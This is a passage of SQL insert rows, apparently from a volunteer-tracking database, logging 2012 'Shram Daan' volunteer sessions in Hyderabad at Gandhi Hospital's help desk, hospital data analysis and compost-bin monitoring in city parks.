(859, '342', '2012-08-27', '2012-08-27', '09:30:00', '12:00:00', '2', 'Shram Daan', 'Environment', 'Monitoring compost bins at NTR and LUMBINI park', 'Onsite', 'Hyderabad', 'ADC', '', 7),
(860, '343', '2012-08-27', '2012-08-27', '09:30:00', '12:00:00', '2', 'Shram Daan', 'Environment', 'Monitoring compost bins at NTR and LUMBINI park', 'Onsite', 'Hyderabad', 'ADC', '', 7),
(861, '344', '2012-08-27', '2012-08-27', '09:30:00', '12:00:00', '2', 'Shram Daan', 'Environment', 'Monitoring compost bins at NTR and LUMBINI park', 'Onsite', 'Hyderabad', 'ADC', '', 7),
(862, '345', '2012-08-27', '2012-08-27', '09:30:00', '12:00:00', '2', 'Shram Daan', 'Environment', 'Monitoring compost bins at NTR and LUMBINI park', 'Onsite', 'Hyderabad', 'ADC', '', 7),
(863, '346', '2012-08-27', '2012-08-27', '09:30:00', '12:00:00', '2', 'Shram Daan', 'Environment', 'Monitoring compost bins at NTR and LUMBINI park', 'Onsite', 'Hyderabad', 'ADC', '', 7),
(864, '234', '2012-08-27', '2012-08-27', '09:30:00', '12:00:00', '2', 'Shram Daan', 'Health', 'Data analysis at Gandhi Hospital', 'Onsite', 'Hyderabad', 'ADC', '', 12),
(865, '229', '2012-08-27', '2012-08-27', '09:30:00', '12:00:00', '2', 'Shram Daan', 'Health', 'Data analysis at Gandhi Hospital', 'Onsite', 'Hyderabad', 'ADC', '', 12),
(866, '347', '2012-08-27', '2012-08-27', '09:30:00', '12:00:00', '2', 'Shram Daan', 'Health', 'May I Help you desk at Gandhi Hospital', 'Onsite', 'Hyderabad', 'ADC', '', 12),
(867, '348', '2012-08-27', '2012-08-27', '09:30:00', '12:00:00', '2', 'Shram Daan', 'Health', 'May I Help you desk at Gandhi Hospital', 'Onsite', 'Hyderabad', 'ADC', '', 12),
(868, '309', '2012-08-27', '2012-08-27', '09:30:00', '12:00:00', '2', 'Shram Daan', 'Health', 'May I Help you desk at Gandhi Hospital', 'Onsite', 'Hyderabad', 'ADC', '', 12),
(869, '350', '2012-08-27', '2012-08-27', '09:30:00', '12:00:00', '2', 'Shram Daan', 'Health', 'May I Help you desk at Gandhi Hospital', 'Onsite', 'Hyderabad', 'ADC', '', 12),
(870, '351', '2012-08-27', '2012-08-27', '09:30:00', '12:00:00', '2', 'Shram Daan', 'Health', 'May I Help you desk at Gandhi Hospital', 'Onsite', 'Hyderabad', 'ADC', '', 12),
(871, '306', '2012-08-27', '2012-08-27', '09:30:00', '12:00:00', '2', 'Shram Daan', 'Health', 'May I Help you desk at Gandhi Hospital', 'Onsite', 'Hyderabad', 'ADC', '', 12),
(872, '307', '2012-08-27', '2012-08-27', '09:30:00', '12:00:00', '2', 'Shram Daan', 'Health', 'May I Help you desk at Gandhi Hospital', 'Onsite', 'Hyderabad', 'ADC', '', 12),
(873, '171', '2012-08-27', '2012-08-27', '09:30:00', '12:00:00', '2', 'Shram Daan', 'Health', 'May I Help you desk at Gandhi Hospital', 'Onsite', 'Hyderabad', 'ADC', '', 12),
(874, '170', '2012-08-27', '2012-08-27', '09:30:00', '12:00:00', '2', 'Shram Daan', 'Health', 'May I Help you desk at Gandhi Hospital', 'Onsite', 'Hyderabad', 'ADC', '', 12),
(875, '314', '2012-08-28', '2012-08-28', '09:30:00', '12:00:00', '2', 'Shram Daan', 'Health', 'Supporting Digitisation efforts at IPM', 'Onsite', 'Hyderabad', 'ADC', '', 13),
(876, '319', '2012-08-28', '2012-08-28', '09:30:00', '12:00:00', '2', 'Shram Daan', 'Health', 'Supporting Digitisation efforts at IPM', 'Onsite', 'Hyderabad', 'ADC', '', 13),
(877, '234', '2012-08-28', '2012-08-28', '09:30:00', '12:00:00', '2', 'Shram Daan', 'Health', 'Data analysis at Gandhi Hospital', 'Onsite', 'Hyderabad', 'ADC', '', 12),
(878, '229', '2012-08-28', '2012-08-28', '09:30:00', '12:00:00', '2', 'Shram Daan', 'Health', 'Data analysis at Gandhi Hospital', 'Onsite', 'Hyderabad', 'ADC', '', 12),
(879, '352', '2012-08-28', '2012-08-28', '09:30:00', '12:00:00', '2', 'Shram Daan', 'Health', 'May I Help you desk at Gandhi Hospital', 'Onsite', 'Hyderabad', 'ADC', '', 12),
(880, '353', '2012-08-28', '2012-08-28', '09:30:00', '12:00:00', '2', 'Shram Daan', 'Health', 'May I Help you desk at Gandhi Hospital', 'Onsite', 'Hyderabad', 'ADC', '', 12),
(881, '354', '2012-08-28', '2012-08-28', '09:30:00', '12:00:00', '2', 'Shram Daan', 'Health', 'May I Help you desk at Gandhi Hospital', 'Onsite', 'Hyderabad', 'ADC', '', 12),
(882, '355', '2012-08-28', '2012-08-28', '09:30:00', '12:00:00', '2', 'Shram Daan', 'Health', 'May I Help you desk at Gandhi Hospital', 'Onsite', 'Hyderabad', 'ADC', '', 12),
(883, '356', '2012-08-28', '2012-08-28', '09:30:00', '12:00:00', '2', 'Shram Daan', 'Health', 'May I Help you desk at Gandhi Hospital', 'Onsite', 'Hyderabad', 'ADC', '', 12),
(884, '228', '2012-08-29', '2012-08-29', '09:30:00', '12:00:00', '2', 'Shram Daan', 'Health', 'Data analysis at Gandhi Hospital', 'Onsite', 'Hyderabad', 'ADC', '', 12),
(885, '283', '2012-08-29', '2012-08-29', '09:30:00', '12:00:00', '2', 'Shram Daan', 'Health', 'May I Help you desk at Gandhi Hospital', 'Onsite', 'Hyderabad', 'ADC', '', 12),
(886, '370', '2012-08-29', '2012-08-29', '09:30:00', '12:00:00', '2', 'Shram Daan', 'Health', 'May I Help you desk at Gandhi Hospital', 'Onsite', 'Hyderabad', 'ADC', '', 12),
(887, '282', '2012-08-29', '2012-08-29', '09:30:00', '12:00:00', '2', 'Shram Daan', 'Health', 'May I Help you desk at Gandhi Hospital', 'Onsite', 'Hyderabad', 'ADC', '', 12),
(888, '363', '2012-08-29', '2012-08-29', '09:30:00', '12:00:00', '2', 'Shram Daan', 'Health', 'May I Help you desk at Gandhi Hospital', 'Onsite', 'Hyderabad', 'ADC', '', 12),
(889, '361', '2012-08-29', '2012-08-29', '09:30:00', '12:00:00', '2', 'Shram Daan', 'Health', 'May I Help you desk at Gandhi Hospital', 'Onsite', 'Hyderabad', 'ADC', '', 12),
(890, '185', '2012-08-29', '2012-08-29', '09:30:00', '12:00:00', '2', 'Shram Daan', 'Health', 'May I Help you desk at Gandhi Hospital', 'Onsite', 'Hyderabad', 'ADC', '', 12),
(891, '194', '2012-08-29', '2012-08-29', '09:30:00', '12:00:00', '2', 'Shram Daan', 'Health', 'May I Help you desk at Gandhi Hospital', 'Onsite', 'Hyderabad', 'ADC', '', 12),
(892, '195', '2012-08-29', '2012-08-29', '09:30:00', '12:00:00', '2', 'Shram Daan', 'Health', 'May I Help you desk at Gandhi Hospital', 'Onsite', 'Hyderabad', 'ADC', '', 12),
(893, '196', '2012-08-29', '2012-08-29', '09:30:00', '12:00:00', '2', 'Shram Daan', 'Health', 'May I Help you desk at Gandhi Hospital', 'Onsite', 'Hyderabad', 'ADC', '', 12),
(894, '197', '2012-08-29', '2012-08-29', '09:30:00', '12:00:00', '2', 'Shram Daan', 'Health', 'May I Help you desk at Gandhi Hospital', 'Onsite', 'Hyderabad', 'ADC', '', 12),
(895, '362', '2012-08-29', '2012-08-29', '09:30:00', '12:00:00', '2', 'Shram Daan', 'Health', 'May I Help you desk at Gandhi Hospital', 'Onsite', 'Hyderabad', 'ADC', '', 12),
(896, '318', '2012-08-30', '2012-08-30', '09:30:00', '12:00:00', '2', 'Shram Daan', 'Health', 'May I Help you desk at Gandhi Hospital', 'Onsite', 'Hyderabad', 'ADC', '', 12),
(897, '257', '2012-08-30', '2012-08-30', '09:30:00', '12:00:00', '2', 'Shram Daan', 'Health', 'May I Help you desk at Gandhi Hospital', 'Onsite', 'Hyderabad', 'ADC', '', 12),
(898, '258', '2012-08-30', '2012-08-30', '09:30:00', '12:00:00', '2', 'Shram Daan', 'Health', 'May I Help you desk at Gandhi Hospital', 'Onsite', 'Hyderabad', 'ADC', '', 12),
(899, '259', '2012-08-30', '2012-08-30', '09:30:00', '12:00:00', '2', 'Shram Daan', 'Health', 'May I Help you desk at Gandhi Hospital', 'Onsite', 'Hyderabad', 'ADC', '', 12),
(900, '274', '2012-08-30', '2012-08-30', '09:30:00', '12:00:00', '2', 'Shram Daan', 'Health', 'May I Help you desk at Gandhi Hospital', 'Onsite', 'Hyderabad', 'ADC', '', 12),
(901, '198', '2012-08-30', '2012-08-30', '09:30:00', '12:00:00', '2', 'Shram Daan', 'Health', 'May I Help you desk at Gandhi Hospital', 'Onsite', 'Hyderabad', 'ADC', '', 12),
(902, '199', '2012-08-30', '2012-08-30', '09:30:00', '12:00:00', '2', 'Shram Daan', 'Health', 'May I Help you desk at Gandhi Hospital', 'Onsite', 'Hyderabad', 'ADC', '', 12),
(903, '190', '2012-08-30', '2012-08-30', '09:30:00', '12:00:00', '2', 'Shram Daan', 'Health', 'May I Help you desk at Gandhi Hospital', 'Onsite', 'Hyderabad', 'ADC', '', 12),
(904, '170', '2012-08-31', '2012-08-31', '09:30:00', '12:00:00', '2', 'Shram Daan', 'Health', 'May I Help you desk at Gandhi Hospital', 'Onsite', 'Hyderabad', 'ADC', '', 12),
(905, '171', '2012-08-31', '2012-08-31', '09:30:00', '12:00:00', '2', 'Shram Daan', 'Health', 'May I Help you desk at Gandhi Hospital', 'Onsite', 'Hyderabad', 'ADC', '', 12),
(906, '203', '2012-08-31', '2012-08-31', '09:30:00', '12:00:00', '2', 'Shram Daan', 'Health', 'May I Help you desk at Gandhi Hospital', 'Onsite', 'Hyderabad', 'ADC', '', 12),
(907, '204', '2012-08-31', '2012-08-31', '09:30:00', '12:00:00', '2', 'Shram Daan', 'Health', 'May I Help you desk at Gandhi Hospital', 'Onsite', 'Hyderabad', 'ADC', '', 12),
(908, '328', '2012-08-31', '2012-08-31', '09:30:00', '12:00:00', '2', 'Shram Daan', 'Health', 'May I Help you desk at Gandhi Hospital', 'Onsite', 'Hyderabad', 'ADC', '', 12),
(909, '189', '2012-08-31', '2012-08-31', '09:30:00', '12:00:00', '2', 'Shram Daan', 'Health', 'May I Help you desk at Gandhi Hospital', 'Onsite', 'Hyderabad', 'ADC', '', 12),
(910, '320', '2012-08-31', '2012-08-31', '09:30:00', '12:00:00', '2', 'Shram Daan', 'Health', 'May I Help you desk at Gandhi Hospital', 'Onsite', 'Hyderabad', 'ADC', '', 12),
(911, '228', '2012-09-01', '2012-09-01', '09:30:00', '12:00:00', '2', 'Shram Daan', 'Health', 'Data analysis at Gandhi Hospital', 'Onsite', 'Hyderabad', 'ADC', '', 12),
(912, '232', '2012-09-01', '2012-09-01', '09:30:00', '12:00:00', '2', 'Shram Daan', 'Health', 'Data analysis at Gandhi Hospital', 'Onsite', 'Hyderabad', 'ADC', '', 12),
(913, '265', '2012-09-01', '2012-09-01', '09:30:00', '12:00:00', '2', 'Shram Daan', 'Health', 'May I Help you desk at Gandhi Hospital', 'Onsite', 'Hyderabad', 'ADC', '', 12),
(914, '213', '2012-09-01', '2012-09-01', '09:30:00', '12:00:00', '2', 'Shram Daan', 'Health', 'May I Help you desk at Gandhi Hospital', 'Onsite', 'Hyderabad', 'ADC', '', 12),
(915, '212', '2012-09-01', '2012-09-01', '09:30:00', '12:00:00', '2', 'Shram Daan', 'Health', 'May I Help you desk at Gandhi Hospital', 'Onsite', 'Hyderabad', 'ADC', '', 12),
(916, '364', '2012-09-01', '2012-09-01', '09:30:00', '12:00:00', '2', 'Shram Daan', 'Health', 'May I Help you desk at Gandhi Hospital', 'Onsite', 'Hyderabad', 'ADC', '', 12),
(917, '365', '2012-09-01', '2012-09-01', '09:30:00', '12:00:00', '2', 'Shram Daan', 'Health', 'May I Help you desk at Gandhi Hospital', 'Onsite', 'Hyderabad', 'ADC', '', 12),
(918, '366', '2012-09-01', '2012-09-01', '09:30:00', '12:00:00', '2', 'Shram Daan', 'Health', 'May I Help you desk at Gandhi Hospital', 'Onsite', 'Hyderabad', 'ADC', '', 12),
(919, '367', '2012-09-01', '2012-09-01', '09:30:00', '12:00:00', '2', 'Shram Daan', 'Health', 'May I Help you desk at Gandhi Hospital', 'Onsite', 'Hyderabad', 'ADC', '', 12),
(920, '358', '2012-09-01', '2012-09-01', '09:30:00', '12:00:00', '2', 'Shram Daan', 'Health', 'May I Help you desk at Gandhi Hospital', 'Onsite', 'Hyderabad', 'ADC', '', 12),
(921, '359', '2012-09-01', '2012-09-01', '09:30:00', '12:00:00', '2', 'Shram Daan', 'Health', 'May I Help you desk at Gandhi Hospital', 'Onsite', 'Hyderabad', 'ADC', '', 12),
(922, '347', '2012-09-03', '2012-09-03', '09:30:00', '12:00:00', '2', 'Shram Daan', 'Health', 'May I Help you desk at Gandhi Hospital', 'Onsite', 'Hyderabad', 'ADC', '', 12),
(923, '348', '2012-09-03', '2012-09-03', '09:30:00', '12:00:00', '2', 'Shram Daan', 'Health', 'May I Help you desk at Gandhi Hospital', 'Onsite', 'Hyderabad', 'ADC', '', 12),
(924, '309', '2012-09-03', '2012-09-03', '09:30:00', '12:00:00', '2', 'Shram Daan', 'Health', 'May I Help you desk at Gandhi Hospital', 'Onsite', 'Hyderabad', 'ADC', '', 12),
(925, '350', '2012-09-03', '2012-09-03', '09:30:00', '12:00:00', '2', 'Shram Daan', 'Health', 'May I Help you desk at Gandhi Hospital', 'Onsite', 'Hyderabad', 'ADC', '', 12),
(926, '351', '2012-09-03', '2012-09-03', '09:30:00', '12:00:00', '2', 'Shram Daan', 'Health', 'May I Help you desk at Gandhi Hospital', 'Onsite', 'Hyderabad', 'ADC', '', 12),
(927, '306', '2012-09-03', '2012-09-03', '09:30:00', '12:00:00', '2', 'Shram Daan', 'Health', 'May I Help you desk at Gandhi Hospital', 'Onsite', 'Hyderabad', 'ADC', '', 12),
(928, '307', '2012-09-03', '2012-09-03', '09:30:00', '12:00:00', '2', 'Shram Daan', 'Health', 'May I Help you desk at Gandhi Hospital', 'Onsite', 'Hyderabad', 'ADC', '', 12),
(929, '360', '2012-09-03', '2012-09-03', '09:30:00', '12:00:00', '2', 'Shram Daan', 'Health', 'May I Help you desk at Gandhi Hospital', 'Onsite', 'Hyderabad', 'ADC', '', 12),
(930, '170', '2012-09-03', '2012-09-03', '09:30:00', '12:00:00', '2', 'Shram Daan', 'Health', 'May I Help you desk at Gandhi Hospital', 'Onsite', 'Hyderabad', 'ADC', '', 12),
(931, '171', '2012-09-03', '2012-09-03', '09:30:00', '12:00:00', '2', 'Shram Daan', 'Health', 'May I Help you desk at Gandhi Hospital', 'Onsite', 'Hyderabad', 'ADC', '', 12),
(932, '352', '2012-09-04', '2012-09-04', '09:30:00', '12:00:00', '2', 'Shram Daan', 'Health', 'May I Help you desk at Gandhi Hospital', 'Onsite', 'Hyderabad', 'ADC', '', 12),
(933, '353', '2012-09-04', '2012-09-04', '09:30:00', '12:00:00', '2', 'Shram Daan', 'Health', 'May I Help you desk at Gandhi Hospital', 'Onsite', 'Hyderabad', 'ADC', '', 12),
(934, '354', '2012-09-04', '2012-09-04', '09:30:00', '12:00:00', '2', 'Shram Daan', 'Health', 'May I Help you desk at Gandhi Hospital', 'Onsite', 'Hyderabad', 'ADC', '', 12),
(935, '355', '2012-09-04', '2012-09-04', '09:30:00', '12:00:00', '2', 'Shram Daan', 'Health', 'May I Help you desk at Gandhi Hospital', 'Onsite', 'Hyderabad', 'ADC', '', 12),
(936, '356', '2012-09-04', '2012-09-04', '09:30:00', '12:00:00', '2', 'Shram Daan', 'Health', 'May I Help you desk at Gandhi Hospital', 'Onsite', 'Hyderabad', 'ADC', '', 12),
(937, '357', '2012-09-04', '2012-09-04', '09:30:00', '12:00:00', '2', 'Shram Daan', 'Health', 'May I Help you desk at Gandhi Hospital', 'Onsite', 'Hyderabad', 'ADC', '', 12),
(938, '227', '2012-09-05', '2012-09-05', '10:00:00', '13:00:00', '2', 'Shram Daan', 'Health', 'Data analysis at Gandhi Hospital', 'Onsite', 'Hyderabad', 'ADC', '', 12),
(939, '228', '2012-09-05', '2012-09-05', '10:00:00', '13:00:00', '2', 'Shram Daan', 'Health', 'Data analysis at Gandhi Hospital', 'Onsite', 'Hyderabad', 'ADC', '', 12),
(940, '229', '2012-09-05', '2012-09-05', '10:00:00', '13:00:00', '2', 'Shram Daan', 'Health', 'Data analysis at Gandhi Hospital', 'Onsite', 'Hyderabad', 'ADC', '', 12),
(941, '232', '2012-09-05', '2012-09-05', '10:00:00', '13:00:00', '2', 'Shram Daan', 'Health', 'Data analysis at Gandhi Hospital', 'Onsite', 'Hyderabad', 'ADC', '', 12),
(942, '318', '2012-09-05', '2012-09-05', '09:30:00', '12:00:00', '2', 'Shram Daan', 'Health', 'May I Help you desk at Gandhi Hospital', 'Onsite', 'Hyderabad', 'ADC', '', 12),
(943, '260', '2012-09-05', '2012-09-05', '09:30:00', '12:00:00', '2', 'Shram Daan', 'Health', 'May I Help you desk at Gandhi Hospital', 'Onsite', 'Hyderabad', 'ADC', '', 12),
(944, '258', '2012-09-05', '2012-09-05', '09:30:00', '12:00:00', '2', 'Shram Daan', 'Health', 'May I Help you desk at Gandhi Hospital', 'Onsite', 'Hyderabad', 'ADC', '', 12),
(945, '274', '2012-09-05', '2012-09-05', '09:30:00', '12:00:00', '2', 'Shram Daan', 'Health', 'May I Help you desk at Gandhi Hospital', 'Onsite', 'Hyderabad', 'ADC', '', 12),
(946, '257', '2012-09-05', '2012-09-05', '09:30:00', '12:00:00', '2', 'Shram Daan', 'Health', 'May I Help you desk at Gandhi Hospital', 'Onsite', 'Hyderabad', 'ADC', '', 12),
(947, '198', '2012-09-05', '2012-09-05', '09:30:00', '12:00:00', '2', 'Shram Daan', 'Health', 'May I Help you desk at Gandhi Hospital', 'Onsite', 'Hyderabad', 'ADC', '', 12),
(948, '259', '2012-09-05', '2012-09-05', '09:30:00', '12:00:00', '2', 'Shram Daan', 'Health', 'May I Help you desk at Gandhi Hospital', 'Onsite', 'Hyderabad', 'ADC', '', 12),
(949, '194', '2012-09-06', '2012-09-06', '09:30:00', '12:00:00', '2', 'Shram Daan', 'Health', 'May I Help you desk at Gandhi Hospital', 'Onsite', 'Hyderabad', 'ADC', '', 12),
(950, '195', '2012-09-06', '2012-09-06', '09:30:00', '12:00:00', '2', 'Shram Daan', 'Health', 'May I Help you desk at Gandhi Hospital', 'Onsite', 'Hyderabad', 'ADC', '', 12),
(951, '282', '2012-09-06', '2012-09-06', '09:30:00', '12:00:00', '2', 'Shram Daan', 'Health', 'May I Help you desk at Gandhi Hospital', 'Onsite', 'Hyderabad', 'ADC', '', 12),
(952, '363', '2012-09-06', '2012-09-06', '09:30:00', '12:00:00', '2', 'Shram Daan', 'Health', 'May I Help you desk at Gandhi Hospital', 'Onsite', 'Hyderabad', 'ADC', '', 12),
(953, '185', '2012-09-06', '2012-09-06', '09:30:00', '12:00:00', '2', 'Shram Daan', 'Health', 'May I Help you desk at Gandhi Hospital', 'Onsite', 'Hyderabad', 'ADC', '', 12),
(954, '196', '2012-09-06', '2012-09-06', '09:30:00', '12:00:00', '2', 'Shram Daan', 'Health', 'May I Help you desk at Gandhi Hospital', 'Onsite', 'Hyderabad', 'ADC', '', 12),
(955, '362', '2012-09-06', '2012-09-06', '09:30:00', '12:00:00', '2', 'Shram Daan', 'Health', 'May I Help you desk at Gandhi Hospital', 'Onsite', 'Hyderabad', 'ADC', '', 12),
(956, '183', '2012-09-06', '2012-09-06', '09:30:00', '12:00:00', '2', 'Shram Daan', 'Health', 'May I Help you desk at Gandhi Hospital', 'Onsite', 'Hyderabad', 'ADC', '', 12),
(957, '310', '2012-09-07', '2012-09-07', '09:30:00', '12:00:00', '2', 'Shram Daan', 'Environment', 'Monitoring compost bins at NTR and LUMBINI park', 'Onsite', 'Hyderabad', 'ADC', '', 7),
(958, '313', '2012-09-07', '2012-09-07', '09:30:00', '12:00:00', '2', 'Shram Daan', 'Environment', 'Monitoring compost bins at NTR and LUMBINI park', 'Onsite', 'Hyderabad', 'ADC', '', 7),
(959, '311', '2012-09-07', '2012-09-07', '09:30:00', '12:00:00', '2', 'Shram Daan', 'Environment', 'Monitoring compost bins at NTR and LUMBINI park', 'Onsite', 'Hyderabad', 'ADC', '', 7),
(960, '368', '2012-09-07', '2012-09-07', '09:30:00', '12:00:00', '2', 'Shram Daan', 'Environment', 'Monitoring compost bins at NTR and LUMBINI park', 'Onsite', 'Hyderabad', 'ADC', '', 7),
(961, '369', '2012-09-07', '2012-09-07', '09:30:00', '12:00:00', '2', 'Shram Daan', 'Environment', 'Monitoring compost bins at NTR and LUMBINI park', 'Onsite', 'Hyderabad', 'ADC', '', 7),
(962, '276', '2012-09-07', '2012-09-07', '09:30:00', '12:00:00', '2', 'Shram Daan', 'Environment', 'Monitoring compost bins at NTR and LUMBINI park', 'Onsite', 'Hyderabad', 'ADC', '', 7),
(963, '277', '2012-09-07', '2012-09-07', '09:30:00', '12:00:00', '2', 'Shram Daan', 'Environment', 'Monitoring compost bins at NTR and LUMBINI park', 'Onsite', 'Hyderabad', 'ADC', '', 7),
(964, '278', '2012-09-07', '2012-09-07', '09:30:00', '12:00:00', '2', 'Shram Daan', 'Environment', 'Monitoring compost bins at NTR and LUMBINI park', 'Onsite', 'Hyderabad', 'ADC', '', 7),
(965, '279', '2012-09-07', '2012-09-07', '09:30:00', '12:00:00', '2', 'Shram Daan', 'Environment', 'Monitoring compost bins at NTR and LUMBINI park', 'Onsite', 'Hyderabad', 'ADC', '', 7),
(966, '202', '2012-09-07', '2012-09-07', '09:30:00', '12:00:00', '2', 'Shram Daan', 'Environment', 'Monitoring compost bins at NTR and LUMBINI park', 'Onsite', 'Hyderabad', 'ADC', '', 7),
(967, '169', '2012-09-07', '2012-09-07', '09:30:00', '12:00:00', '2', 'Shram Daan', 'Environment', 'Monitoring compost bins at NTR and LUMBINI park', 'Onsite', 'Hyderabad', 'ADC', '', 7),
(968, '190', '2012-09-07', '2012-09-07', '09:30:00', '12:00:00', '2', 'Shram Daan', 'Health', 'May I Help you desk at Gandhi Hospital', 'Onsite', 'Hyderabad', 'ADC', '', 12),
(969, '170', '2012-09-07', '2012-09-07', '09:30:00', '12:00:00', '2', 'Shram Daan', 'Health', 'May I Help you desk at Gandhi Hospital', 'Onsite', 'Hyderabad', 'ADC', '', 12),
(970, '171', '2012-09-07', '2012-09-07', '09:30:00', '12:00:00', '2', 'Shram Daan', 'Health', 'May I Help you desk at Gandhi Hospital', 'Onsite', 'Hyderabad', 'ADC', '', 12),
(971, '203', '2012-09-07', '2012-09-07', '09:30:00', '12:00:00', '2', 'Shram Daan', 'Health', 'May I Help you desk at Gandhi Hospital', 'Onsite', 'Hyderabad', 'ADC', '', 12),
(972, '204', '2012-09-07', '2012-09-07', '09:30:00', '12:00:00', '2', 'Shram Daan', 'Health', 'May I Help you desk at Gandhi Hospital', 'Onsite', 'Hyderabad', 'ADC', '', 12),
(973, '328', '2012-09-07', '2012-09-07', '09:30:00', '12:00:00', '2', 'Shram Daan', 'Health', 'May I Help you desk at Gandhi Hospital', 'Onsite', 'Hyderabad', 'ADC', '', 12),
(974, '189', '2012-09-07', '2012-09-07', '09:30:00', '12:00:00', '2', 'Shram Daan', 'Health', 'May I Help you desk at Gandhi Hospital', 'Onsite', 'Hyderabad', 'ADC', '', 12),
(975, '320', '2012-09-07', '2012-09-07', '09:30:00', '12:00:00', '2', 'Shram Daan', 'Health', 'May I Help you desk at Gandhi Hospital', 'Onsite', 'Hyderabad', 'ADC', '', 12),
(976, '371', '2012-09-08', '2012-09-08', '09:30:00', '13:00:00', '3', 'Shram Daan', 'Health', 'Data analysis at Gandhi Hospital', 'Onsite', 'Hyderabad', 'ADC', '', 12),
(977, '227', '2012-07-21', '2012-07-21', '10:00:00', '12:00:00', '2', 'Shram Daan', 'Health', 'Data analysis at Gandhi Hospital', 'Onsite', 'Hyderabad', 'ADC', '', 12),
(978, '228', '2012-07-21', '2012-07-21', '10:00:00', '12:00:00', '2', 'Shram Daan', 'Health', 'Data analysis at Gandhi Hospital', 'Onsite', 'Hyderabad', 'ADC', '', 12),
(979, '229', '2012-07-21', '2012-07-21', '10:00:00', '12:00:00', '2', 'Shram Daan', 'Health', 'Data analysis at Gandhi Hospital', 'Onsite', 'Hyderabad', 'ADC', '', 12),
(980, '232', '2012-07-21', '2012-07-21', '10:00:00', '12:00:00', '2', 'Shram Daan', 'Health', 'Data analysis at Gandhi Hospital', 'Onsite', 'Hyderabad', 'ADC', '', 12),
(981, '227', '2012-07-25', '2012-07-25', '10:00:00', '12:00:00', '2', 'Shram Daan', 'Health', 'Data analysis at Gandhi Hospital', 'Onsite', 'Hyderabad', 'ADC', '', 12),
(982, '228', '2012-07-25', '2012-07-25', '10:00:00', '12:00:00', '2', 'Shram Daan', 'Health', 'Data analysis at Gandhi Hospital', 'Onsite', 'Hyderabad', 'ADC', '', 12),
(983, '229', '2012-07-25', '2012-07-25', '10:00:00', '12:00:00', '2', 'Shram Daan', 'Health', 'Data analysis at Gandhi Hospital', 'Onsite', 'Hyderabad', 'ADC', '', 12),
(984, '232', '2012-07-25', '2012-07-25', '10:00:00', '12:00:00', '2', 'Shram Daan', 'Health', 'Data analysis at Gandhi Hospital', 'Onsite', 'Hyderabad', 'ADC', '', 12),
(985, '276', '2012-09-10', '2012-09-10', '09:30:00', '13:00:00', '3', 'Shram Daan', 'Environment', 'Monitoring compost bins at NTR and LUMBINI park', 'Onsite', 'Hyderabad', 'ADC', '', 7),
(986, '277', '2012-09-10', '2012-09-10', '09:30:00', '13:00:00', '3', 'Shram Daan', 'Environment', 'Monitoring compost bins at NTR and LUMBINI park', 'Onsite', 'Hyderabad', 'ADC', '', 7),
(987, '278', '2012-09-10', '2012-09-10', '09:30:00', '13:00:00', '3', 'Shram Daan', 'Environment', 'Monitoring compost bins at NTR and LUMBINI park', 'Onsite', 'Hyderabad', 'ADC', '', 7),
(988, '279', '2012-09-10', '2012-09-10', '09:30:00', '13:00:00', '3', 'Shram Daan', 'Environment', 'Monitoring compost bins at NTR and LUMBINI park', 'Onsite', 'Hyderabad', 'ADC', '', 7),
(989, '352', '2012-09-11', '2012-09-11', '09:30:00', '12:00:00', '2', 'Shram Daan', 'Health', 'May I Help you desk at Gandhi Hospital', 'Onsite', 'Hyderabad', 'ADC', '', 12),
(990, '353', '2012-09-11', '2012-09-11', '09:30:00', '12:00:00', '2', 'Shram Daan', 'Health', 'May I Help you desk at Gandhi Hospital', 'Onsite', 'Hyderabad', 'ADC', '', 12),
(991, '354', '2012-09-11', '2012-09-11', '09:30:00', '12:00:00', '2', 'Shram Daan', 'Health', 'May I Help you desk at Gandhi Hospital', 'Onsite', 'Hyderabad', 'ADC', '', 12),
(992, '355', '2012-09-11', '2012-09-11', '09:30:00', '12:00:00', '2', 'Shram Daan', 'Health', 'May I Help you desk at Gandhi Hospital', 'Onsite', 'Hyderabad', 'ADC', '', 12),
(993, '356', '2012-09-11', '2012-09-11', '09:30:00', '12:00:00', '2', 'Shram Daan', 'Health', 'May I Help you desk at Gandhi Hospital', 'Onsite', 'Hyderabad', 'ADC', '', 12),
(994, '357', '2012-09-11', '2012-09-11', '09:30:00', '12:00:00', '2', 'Shram Daan', 'Health', 'May I Help you desk at Gandhi Hospital', 'Onsite', 'Hyderabad', 'ADC', '', 12),
(995, '347', '2012-09-12', '2012-09-12', '09:30:00', '12:00:00', '2', 'Shram Daan', 'Health', 'May I Help you desk at Gandhi Hospital', 'Onsite', 'Hyderabad', 'ADC', '', 12),
(996, '348', '2012-09-12', '2012-09-12', '09:30:00', '12:00:00', '2', 'Shram Daan', 'Health', 'May I Help you desk at Gandhi Hospital', 'Onsite', 'Hyderabad', 'ADC', '', 12),
(997, '309', '2012-09-12', '2012-09-12', '09:30:00', '12:00:00', '2', 'Shram Daan', 'Health', 'May I Help you desk at Gandhi Hospital', 'Onsite', 'Hyderabad', 'ADC', '', 12),
(998, '350', '2012-09-12', '2012-09-12', '09:30:00', '12:00:00', '2', 'Shram Daan', 'Health', 'May I Help you desk at Gandhi Hospital', 'Onsite', 'Hyderabad', 'ADC', '', 12),
(999, '351', '2012-09-12', '2012-09-12', '09:30:00', '12:00:00', '2', 'Shram Daan', 'Health', 'May I Help you desk at Gandhi Hospital', 'Onsite', 'Hyderabad', 'ADC', '', 12),
(1000, '306', '2012-09-12', '2012-09-12', '09:30:00', '12:00:00', '2', 'Shram Daan', 'Health', 'May I Help you desk at Gandhi Hospital', 'Onsite', 'Hyderabad', 'ADC', '', 12),
(1001, '307', '2012-09-12', '2012-09-12', '09:30:00', '12:00:00', '2', 'Shram Daan', 'Health', 'May I Help you desk at Gandhi Hospital', 'Onsite', 'Hyderabad', 'ADC', '', 12),
(1002, '360', '2012-09-12', '2012-09-12', '09:30:00', '12:00:00', '2', 'Shram Daan', 'Health', 'May I Help you desk at Gandhi Hospital', 'Onsite', 'Hyderabad', 'ADC', '', 12),
(1003, '199', '2012-09-12', '2012-09-12', '09:30:00', '12:00:00', '2', 'Shram Daan', 'Health', 'May I Help you desk at Gandhi Hospital', 'Onsite', 'Hyderabad', 'ADC', '', 12),
(1004, '259', '2012-09-12', '2012-09-12', '09:30:00', '12:00:00', '2', 'Shram Daan', 'Health', 'May I Help you desk at Gandhi Hospital', 'Onsite', 'Hyderabad', 'ADC', '', 12),
(1005, '318', '2012-09-12', '2012-09-12', '09:30:00', '12:00:00', '2', 'Shram Daan', 'Health', 'May I Help you desk at Gandhi Hospital', 'Onsite', 'Hyderabad', 'ADC', '', 12),
